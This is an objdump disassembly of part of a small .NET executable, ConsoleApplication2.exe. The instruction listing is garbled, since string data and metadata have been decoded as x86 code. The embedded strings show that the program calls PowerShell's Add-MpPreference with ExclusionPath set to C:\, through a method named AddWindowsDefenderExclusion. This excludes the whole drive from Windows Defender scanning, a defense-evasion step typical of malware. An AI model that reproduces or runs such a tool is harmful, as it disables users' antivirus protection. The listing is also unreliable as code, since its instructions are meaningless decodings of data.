  4025e0:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4025e7:	69 
  4025e8:	62 75 74             	bound  %esi,0x74(%ebp)
  4025eb:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4025ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4025f0:	73 6f                	jae    0x402661
  4025f2:	6c                   	insb   (%dx),%es:(%edi)
  4025f3:	65 41                	gs inc %ecx
  4025f5:	70 70                	jo     0x402667
  4025f7:	6c                   	insb   (%dx),%es:(%edi)
  4025f8:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4025ff:	32 2e                	xor    (%esi),%ch
  402601:	65 78 65             	gs js  0x402669
  402604:	00 53 79             	add    %dl,0x79(%ebx)
  402607:	73 74                	jae    0x40267d
  402609:	65 6d                	gs insl (%dx),%es:(%edi)
  40260b:	2e 52                	cs push %edx
  40260d:	75 6e                	jne    0x40267d
  40260f:	74 69                	je     0x40267a
  402611:	6d                   	insl   (%dx),%es:(%edi)
  402612:	65 2e 56             	gs cs push %esi
  402615:	65 72 73             	gs jb  0x40268b
  402618:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40261f:	53                   	push   %ebx
  402620:	74 72                	je     0x402694
  402622:	69 6e 67 00 70 61 74 	imul   $0x74617000,0x67(%esi),%ebp
  402629:	68 00 53 79 73       	push   $0x73795300
  40262e:	74 65                	je     0x402695
  402630:	6d                   	insl   (%dx),%es:(%edi)
  402631:	2e 43                	cs inc %ebx
  402633:	6f                   	outsl  %ds:(%esi),(%dx)
  402634:	6c                   	insb   (%dx),%es:(%edi)
  402635:	6c                   	insb   (%dx),%es:(%edi)
  402636:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40263b:	6e                   	outsb  %ds:(%esi),(%dx)
  40263c:	73 2e                	jae    0x40266c
  40263e:	4f                   	dec    %edi
  40263f:	62 6a 65             	bound  %ebp,0x65(%edx)
  402642:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  402646:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  402649:	00 50 6f             	add    %dl,0x6f(%eax)
  40264c:	77 65                	ja     0x4026b3
  40264e:	72 53                	jb     0x4026a3
  402650:	68 65 6c 6c 00       	push   $0x6c6c65
  402655:	50                   	push   %eax
  402656:	72 6f                	jb     0x4026c7
  402658:	67 72 61             	addr16 jb 0x4026bc
  40265b:	6d                   	insl   (%dx),%es:(%edi)
  40265c:	00 53 79             	add    %dl,0x79(%ebx)
  40265f:	73 74                	jae    0x4026d5
  402661:	65 6d                	gs insl (%dx),%es:(%edi)
  402663:	00 4d 61             	add    %cl,0x61(%ebp)
  402666:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40266d:	00 41 64             	add    %al,0x64(%ecx)
  402670:	64 57                	fs push %edi
  402672:	69 6e 64 6f 77 73 44 	imul   $0x4473776f,0x64(%esi),%ebp
  402679:	65 66 65 6e          	gs data16 outsb %gs:(%esi),(%dx)
  40267d:	64 65 72 45          	fs gs jb 0x4026c6
  402681:	78 63                	js     0x4026e6
  402683:	6c                   	insb   (%dx),%es:(%edi)
  402684:	75 73                	jne    0x4026f9
  402686:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40268d:	74 65                	je     0x4026f4
  40268f:	6d                   	insl   (%dx),%es:(%edi)
  402690:	2e 4d                	cs dec %ebp
  402692:	61                   	popa
  402693:	6e                   	outsb  %ds:(%esi),(%dx)
  402694:	61                   	popa
  402695:	67 65 6d             	gs insl (%dx),%es:(%di)
  402698:	65 6e                	outsb  %gs:(%esi),(%dx)
  40269a:	74 2e                	je     0x4026ca
  40269c:	41                   	inc    %ecx
  40269d:	75 74                	jne    0x402713
  40269f:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a0:	6d                   	insl   (%dx),%es:(%edi)
  4026a1:	61                   	popa
  4026a2:	74 69                	je     0x40270d
  4026a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4026a6:	00 53 79             	add    %dl,0x79(%ebx)
  4026a9:	73 74                	jae    0x40271f
  4026ab:	65 6d                	gs insl (%dx),%es:(%edi)
  4026ad:	2e 52                	cs push %edx
  4026af:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4026b2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4026b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4026b8:	00 45 78             	add    %al,0x78(%ebp)
  4026bb:	63 65 70             	arpl   %esp,0x70(%ebp)
  4026be:	74 69                	je     0x402729
  4026c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4026c2:	00 41 64             	add    %al,0x64(%ecx)
  4026c5:	64 50                	fs push %eax
  4026c7:	61                   	popa
  4026c8:	72 61                	jb     0x40272b
  4026ca:	6d                   	insl   (%dx),%es:(%edi)
  4026cb:	65 74 65             	gs je  0x402733
  4026ce:	72 00                	jb     0x4026d0
  4026d0:	67 65 74 5f          	addr16 gs je 0x402733
  4026d4:	45                   	inc    %ebp
  4026d5:	72 72                	jb     0x402749
  4026d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d8:	72 00                	jb     0x4026da
  4026da:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4026df:	00 53 79             	add    %dl,0x79(%ebx)
  4026e2:	73 74                	jae    0x402758
  4026e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4026e6:	2e 44                	cs inc %esp
  4026e8:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4026ef:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  4026f6:	74 65                	je     0x40275d
  4026f8:	6d                   	insl   (%dx),%es:(%edi)
  4026f9:	2e 52                	cs push %edx
  4026fb:	75 6e                	jne    0x40276b
  4026fd:	74 69                	je     0x402768
  4026ff:	6d                   	insl   (%dx),%es:(%edi)
  402700:	65 2e 49             	gs cs dec %ecx
  402703:	6e                   	outsb  %ds:(%esi),(%dx)
  402704:	74 65                	je     0x40276b
  402706:	72 6f                	jb     0x402777
  402708:	70 53                	jo     0x40275d
  40270a:	65 72 76             	gs jb  0x402783
  40270d:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  402714:	73 74                	jae    0x40278a
  402716:	65 6d                	gs insl (%dx),%es:(%edi)
  402718:	2e 52                	cs push %edx
  40271a:	75 6e                	jne    0x40278a
  40271c:	74 69                	je     0x402787
  40271e:	6d                   	insl   (%dx),%es:(%edi)
  40271f:	65 2e 43             	gs cs inc %ebx
  402722:	6f                   	outsl  %ds:(%esi),(%dx)
  402723:	6d                   	insl   (%dx),%es:(%edi)
  402724:	70 69                	jo     0x40278f
  402726:	6c                   	insb   (%dx),%es:(%edi)
  402727:	65 72 53             	gs jb  0x40277d
  40272a:	65 72 76             	gs jb  0x4027a3
  40272d:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  402734:	62 75 67             	bound  %esi,0x67(%ebp)
  402737:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40273e:	65 
  40273f:	73 00                	jae    0x402741
  402741:	61                   	popa
  402742:	72 67                	jb     0x4027ab
  402744:	73 00                	jae    0x402746
  402746:	67 65 74 5f          	addr16 gs je 0x4027a9
  40274a:	53                   	push   %ebx
  40274b:	74 72                	je     0x4027bf
  40274d:	65 61                	gs popa
  40274f:	6d                   	insl   (%dx),%es:(%edi)
  402750:	73 00                	jae    0x402752
  402752:	50                   	push   %eax
  402753:	53                   	push   %ebx
  402754:	44                   	inc    %esp
  402755:	61                   	popa
  402756:	74 61                	je     0x4027b9
  402758:	53                   	push   %ebx
  402759:	74 72                	je     0x4027cd
  40275b:	65 61                	gs popa
  40275d:	6d                   	insl   (%dx),%es:(%edi)
  40275e:	73 00                	jae    0x402760
  402760:	67 65 74 5f          	addr16 gs je 0x4027c3
  402764:	48                   	dec    %eax
  402765:	61                   	popa
  402766:	64 45                	fs inc %ebp
  402768:	72 72                	jb     0x4027dc
  40276a:	6f                   	outsl  %ds:(%esi),(%dx)
  40276b:	72 73                	jb     0x4027e0
  40276d:	00 50 53             	add    %dl,0x53(%eax)
  402770:	4f                   	dec    %edi
  402771:	62 6a 65             	bound  %ebp,0x65(%edx)
  402774:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  402778:	6e                   	outsb  %ds:(%esi),(%dx)
  402779:	76 69                	jbe    0x4027e4
  40277b:	72 6f                	jb     0x4027ec
  40277d:	6e                   	outsb  %ds:(%esi),(%dx)
  40277e:	6d                   	insl   (%dx),%es:(%edi)
  40277f:	65 6e                	outsb  %gs:(%esi),(%dx)
  402781:	74 00                	je     0x402783
  402783:	00 00                	add    %al,(%eax)
  402785:	07                   	pop    %es
  402786:	43                   	inc    %ebx
  402787:	00 3a                	add    %bh,(%edx)
  402789:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40278d:	21 41 00             	and    %eax,0x0(%ecx)
  402790:	64 00 64 00 2d       	add    %ah,%fs:0x2d(%eax,%eax,1)
  402795:	00 4d 00             	add    %cl,0x0(%ebp)
  402798:	70 00                	jo     0x40279a
  40279a:	50                   	push   %eax
  40279b:	00 72 00             	add    %dh,0x0(%edx)
  40279e:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  4027a2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4027a6:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4027aa:	63 00                	arpl   %eax,(%eax)
  4027ac:	65 00 01             	add    %al,%gs:(%ecx)
  4027af:	1b 45 00             	sbb    0x0(%ebp),%eax
  4027b2:	78 00                	js     0x4027b4
  4027b4:	63 00                	arpl   %eax,(%eax)
  4027b6:	6c                   	insb   (%dx),%es:(%edi)
  4027b7:	00 75 00             	add    %dh,0x0(%ebp)
  4027ba:	73 00                	jae    0x4027bc
  4027bc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4027c2:	50                   	push   %eax
  4027c3:	00 61 00             	add    %ah,0x0(%ecx)
  4027c6:	74 00                	je     0x4027c8
  4027c8:	68 00 00 00 1f       	push   $0x1f000000
  4027cd:	ee                   	out    %al,(%dx)
  4027ce:	a1 b9 1a 33 c5       	mov    0xc5331ab9,%eax
  4027d3:	4b                   	dec    %ebx
  4027d4:	8f                   	(bad)
  4027d5:	fd                   	std
  4027d6:	8c 66 6d             	mov    %fs,0x6d(%esi)
  4027d9:	35 a9 34 00 04       	xor    $0x40034a9,%eax
  4027de:	20 01                	and    %al,(%ecx)
  4027e0:	01 08                	add    %ecx,(%eax)
  4027e2:	03 20                	add    (%eax),%esp
  4027e4:	00 01                	add    %al,(%ecx)
  4027e6:	05 20 01 01 11       	add    $0x11010120,%eax
  4027eb:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4027ee:	01 01                	add    %eax,(%ecx)
  4027f0:	0e                   	push   %cs
  4027f1:	04 20                	add    $0x20,%al
  4027f3:	01 01                	add    %eax,(%ecx)
  4027f5:	02 03                	add    (%ebx),%al
  4027f7:	07                   	pop    %es
  4027f8:	01 0e                	add    %ecx,(%esi)
  4027fa:	04 07                	add    $0x7,%al
  4027fc:	01 12                	add    %edx,(%edx)
  4027fe:	49                   	dec    %ecx
  4027ff:	04 00                	add    $0x0,%al
  402801:	00 12                	add    %dl,(%edx)
  402803:	49                   	dec    %ecx
  402804:	05 20 01 12 49       	add    $0x49120120,%eax
  402809:	0e                   	push   %cs
  40280a:	06                   	push   %es
  40280b:	20 02                	and    %al,(%edx)
  40280d:	12 49 0e             	adc    0xe(%ecx),%cl
  402810:	1c 08                	sbb    $0x8,%al
  402812:	20 00                	and    %al,(%eax)
  402814:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  402819:	51                   	push   %ecx
  40281a:	03 20                	add    (%eax),%esp
  40281c:	00 02                	add    %al,(%edx)
  40281e:	03 00                	add    (%eax),%eax
  402820:	00 0e                	add    %cl,(%esi)
  402822:	04 20                	add    $0x20,%al
  402824:	00 12                	add    %dl,(%edx)
  402826:	59                   	pop    %ecx
  402827:	08 20                	or     %ah,(%eax)
  402829:	00 15 12 5d 01 12    	add    %dl,0x12015d12
  40282f:	61                   	popa
  402830:	0b 10                	or     (%eax),%edx
  402832:	01 02                	add    %eax,(%edx)
  402834:	0e                   	push   %cs
  402835:	0e                   	push   %cs
  402836:	15 12 69 01 1e       	adc    $0x1e016912,%eax
  40283b:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40283e:	01 12                	add    %edx,(%edx)
  402840:	61                   	popa
  402841:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  402847:	34 e0                	xor    $0xe0,%al
  402849:	89 08                	mov    %ecx,(%eax)
  40284b:	31 bf 38 56 ad 36    	xor    %edi,0x36ad5638(%edi)
  402851:	4e                   	dec    %esi
  402852:	35 05 00 01 01       	xor    $0x1010005,%eax
  402857:	1d 0e 04 00 01       	sbb    $0x100040e,%eax
  40285c:	01 0e                	add    %ecx,(%esi)
  40285e:	08 01                	or     %al,(%ecx)
  402860:	00 08                	add    %cl,(%eax)
  402862:	00 00                	add    %al,(%eax)
  402864:	00 00                	add    %al,(%eax)
  402866:	00 1e                	add    %bl,(%esi)
  402868:	01 00                	add    %eax,(%eax)
  40286a:	01 00                	add    %eax,(%eax)
  40286c:	54                   	push   %esp
  40286d:	02 16                	add    (%esi),%dl
  40286f:	57                   	push   %edi
  402870:	72 61                	jb     0x4028d3
  402872:	70 4e                	jo     0x4028c2
  402874:	6f                   	outsl  %ds:(%esi),(%dx)
  402875:	6e                   	outsb  %ds:(%esi),(%dx)
  402876:	45                   	inc    %ebp
  402877:	78 63                	js     0x4028dc
  402879:	65 70 74             	gs jo  0x4028f0
  40287c:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  402883:	77 73                	ja     0x4028f8
  402885:	01 08                	add    %ecx,(%eax)
  402887:	01 00                	add    %eax,(%eax)
  402889:	02 00                	add    (%eax),%al
  40288b:	00 00                	add    %al,(%eax)
  40288d:	00 00                	add    %al,(%eax)
  40288f:	18 01                	sbb    %al,(%ecx)
  402891:	00 13                	add    %dl,(%ebx)
  402893:	43                   	inc    %ebx
  402894:	6f                   	outsl  %ds:(%esi),(%dx)
  402895:	6e                   	outsb  %ds:(%esi),(%dx)
  402896:	73 6f                	jae    0x402907
  402898:	6c                   	insb   (%dx),%es:(%edi)
  402899:	65 41                	gs inc %ecx
  40289b:	70 70                	jo     0x40290d
  40289d:	6c                   	insb   (%dx),%es:(%edi)
  40289e:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4028a5:	32 00                	xor    (%eax),%al
  4028a7:	00 05 01 00 00 00    	add    %al,0x1
  4028ad:	00 17                	add    %dl,(%edi)
  4028af:	01 00                	add    %eax,(%eax)
  4028b1:	12 43 6f             	adc    0x6f(%ebx),%al
  4028b4:	70 79                	jo     0x40292f
  4028b6:	72 69                	jb     0x402921
  4028b8:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  4028be:	20 20                	and    %ah,(%eax)
  4028c0:	32 30                	xor    (%eax),%dh
  4028c2:	32 34 00             	xor    (%eax,%eax,1),%dh
  4028c5:	00 29                	add    %ch,(%ecx)
  4028c7:	01 00                	add    %eax,(%eax)
  4028c9:	24 41                	and    $0x41,%al
  4028cb:	41                   	inc    %ecx
  4028cc:	35 43 33 30 41       	xor    $0x41303343,%eax
  4028d1:	38 2d 42 36 34 31    	cmp    %ch,0x31343642
  4028d7:	2d 34 38 38 32       	sub    $0x32383834,%eax
  4028dc:	2d 41 35 39 34       	sub    $0x34393541,%eax
  4028e1:	2d 30 35 44 38       	sub    $0x38443530,%eax
  4028e6:	35 41 44 34 41       	xor    $0x41344441,%eax
  4028eb:	31 37                	xor    %esi,(%edi)
  4028ed:	43                   	inc    %ebx
  4028ee:	00 00                	add    %al,(%eax)
  4028f0:	0c 01                	or     $0x1,%al
  4028f2:	00 07                	add    %al,(%edi)
  4028f4:	31 2e                	xor    %ebp,(%esi)
  4028f6:	30 2e                	xor    %ch,(%esi)
  4028f8:	30 2e                	xor    %ch,(%esi)
  4028fa:	30 00                	xor    %al,(%eax)
  4028fc:	00 4d 01             	add    %cl,0x1(%ebp)
  4028ff:	00 1c 2e             	add    %bl,(%esi,%ebp,1)
  402902:	4e                   	dec    %esi
  402903:	45                   	inc    %ebp
  402904:	54                   	push   %esp
  402905:	46                   	inc    %esi
  402906:	72 61                	jb     0x402969
  402908:	6d                   	insl   (%dx),%es:(%edi)
  402909:	65 77 6f             	gs ja  0x40297b
  40290c:	72 6b                	jb     0x402979
  40290e:	2c 56                	sub    $0x56,%al
  402910:	65 72 73             	gs jb  0x402986
  402913:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40291a:	36 2e 32 01          	ss xor %cs:(%ecx),%al
  40291e:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  402922:	46                   	inc    %esi
  402923:	72 61                	jb     0x402986
  402925:	6d                   	insl   (%dx),%es:(%edi)
  402926:	65 77 6f             	gs ja  0x402998
  402929:	72 6b                	jb     0x402996
  40292b:	44                   	inc    %esp
  40292c:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  402933:	61                   	popa
  402934:	6d                   	insl   (%dx),%es:(%edi)
  402935:	65 14 2e             	gs adc $0x2e,%al
  402938:	4e                   	dec    %esi
  402939:	45                   	inc    %ebp
  40293a:	54                   	push   %esp
  40293b:	20 46 72             	and    %al,0x72(%esi)
  40293e:	61                   	popa
  40293f:	6d                   	insl   (%dx),%es:(%edi)
  402940:	65 77 6f             	gs ja  0x4029b2
  402943:	72 6b                	jb     0x4029b0
  402945:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  402948:	36 2e 32 00          	ss xor %cs:(%eax),%al
  40294c:	00 00                	add    %al,(%eax)
  40294e:	00 00                	add    %al,(%eax)
  402950:	da fe                	(bad)
  402952:	03 67 00             	add    0x0(%edi),%esp
  402955:	00 00                	add    %al,(%eax)
  402957:	00 02                	add    %al,(%edx)
  402959:	00 00                	add    %al,(%eax)
  40295b:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40295e:	00 00                	add    %al,(%eax)
  402960:	68 29 00 00 68       	push   $0x68000029
  402965:	0b 00                	or     (%eax),%eax
  402967:	00 52 53             	add    %dl,0x53(%edx)
  40296a:	44                   	inc    %esp
  40296b:	53                   	push   %ebx
  40296c:	65 22 33             	and    %gs:(%ebx),%dh
  40296f:	bb 06 e3 c5 4a       	mov    $0x4ac5e306,%ebx
  402974:	84 0b                	test   %cl,(%ebx)
  402976:	d7                   	xlat   %ds:(%ebx)
  402977:	c3                   	ret
  402978:	34 22                	xor    $0x22,%al
  40297a:	74 47                	je     0x4029c3
  40297c:	01 00                	add    %eax,(%eax)
  40297e:	00 00                	add    %al,(%eax)
  402980:	43                   	inc    %ebx
  402981:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  402985:	65 72 73             	gs jb  0x4029fb
  402988:	5c                   	pop    %esp
  402989:	76 74                	jbe    0x4029ff
  40298b:	72 79                	jb     0x402a06
  40298d:	68 5c 52 69 64       	push   $0x6469525c
  402992:	65 72 50             	gs jb  0x4029e5
  402995:	72 6f                	jb     0x402a06
  402997:	6a 65                	push   $0x65
  402999:	63 74 73 5c          	arpl   %esi,0x5c(%ebx,%esi,2)
  40299d:	43                   	inc    %ebx
  40299e:	6f                   	outsl  %ds:(%esi),(%dx)
  40299f:	6e                   	outsb  %ds:(%esi),(%dx)
  4029a0:	73 6f                	jae    0x402a11
  4029a2:	6c                   	insb   (%dx),%es:(%edi)
  4029a3:	65 41                	gs inc %ecx
  4029a5:	70 70                	jo     0x402a17
  4029a7:	6c                   	insb   (%dx),%es:(%edi)
  4029a8:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4029af:	32 5c 43 6f          	xor    0x6f(%ebx,%eax,2),%bl
  4029b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4029b4:	73 6f                	jae    0x402a25
  4029b6:	6c                   	insb   (%dx),%es:(%edi)
  4029b7:	65 41                	gs inc %ecx
  4029b9:	70 70                	jo     0x402a2b
  4029bb:	6c                   	insb   (%dx),%es:(%edi)
  4029bc:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4029c3:	32 5c 6f 62          	xor    0x62(%edi,%ebp,2),%bl
  4029c7:	6a 5c                	push   $0x5c
  4029c9:	52                   	push   %edx
  4029ca:	65 6c                	gs insb (%dx),%es:(%edi)
  4029cc:	65 61                	gs popa
  4029ce:	73 65                	jae    0x402a35
  4029d0:	5c                   	pop    %esp
  4029d1:	43                   	inc    %ebx
  4029d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4029d4:	73 6f                	jae    0x402a45
  4029d6:	6c                   	insb   (%dx),%es:(%edi)
  4029d7:	65 41                	gs inc %ecx
  4029d9:	70 70                	jo     0x402a4b
  4029db:	6c                   	insb   (%dx),%es:(%edi)
  4029dc:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4029e3:	32 2e                	xor    (%esi),%ch
  4029e5:	70 64                	jo     0x402a4b
  4029e7:	62 00                	bound  %eax,(%eax)
	...
  402a81:	00 00                	add    %al,(%eax)
  402a83:	00 ac 2a 00 00 00 00 	add    %ch,0x0(%edx,%ebp,1)
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	c6                   	(bad)
  402a91:	2a 00                	sub    (%eax),%al
  402a93:	00 00                	add    %al,(%eax)
  402a95:	20 00                	and    %al,(%eax)
	...
  402aab:	00 b8 2a 00 00 00    	add    %bh,0x2a(%eax)
	...
  402ab9:	00 5f 43             	add    %bl,0x43(%edi)
  402abc:	6f                   	outsl  %ds:(%esi),(%dx)
  402abd:	72 45                	jb     0x402b04
  402abf:	78 65                	js     0x402b26
  402ac1:	4d                   	dec    %ebp
  402ac2:	61                   	popa
  402ac3:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402aca:	72 65                	jb     0x402b31
  402acc:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  402ad0:	6c                   	insb   (%dx),%es:(%edi)
  402ad1:	00 00                	add    %al,(%eax)
  402ad3:	00 00                	add    %al,(%eax)
  402ad5:	00 ff                	add    %bh,%bh
  402ad7:	25 00 20 40 00       	and    $0x402000,%eax
